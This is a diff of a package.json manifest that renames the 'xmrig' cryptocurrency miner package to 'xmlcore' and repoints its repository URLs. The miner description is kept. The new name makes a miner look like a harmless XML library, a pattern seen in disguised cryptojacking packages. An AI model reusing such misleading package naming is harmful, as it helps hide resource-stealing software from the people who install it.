@@ -1,5 +1,5 @@
 {
-  "name": "xmrig",
+  "name": "xmlcore",
   "version": "3.0.0",
   "description": "RandomX, CryptoNight and Argon2 miner",
   "main": "index.js",
@@ -11,13 +11,13 @@
   },
   "repository": {
     "type": "git",
-    "url": "git+https://github.com/xmrig/xmrig.git"
+    "url": "git+https://github.com/xmlcore/xmlcore.git"
   },
   "keywords": [],
   "author": "",
   "license": "GPLv3",
   "bugs": {
-    "url": "https://github.com/xmrig/xmrig/issues"
+    "url": "https://github.com/xmlcore/xmlcore/issues"
   },
-  "homepage": "https://github.com/xmrig/xmrig#readme"
+  "homepage": "https://github.com/xmlcore/xmlcore#readme"
 }
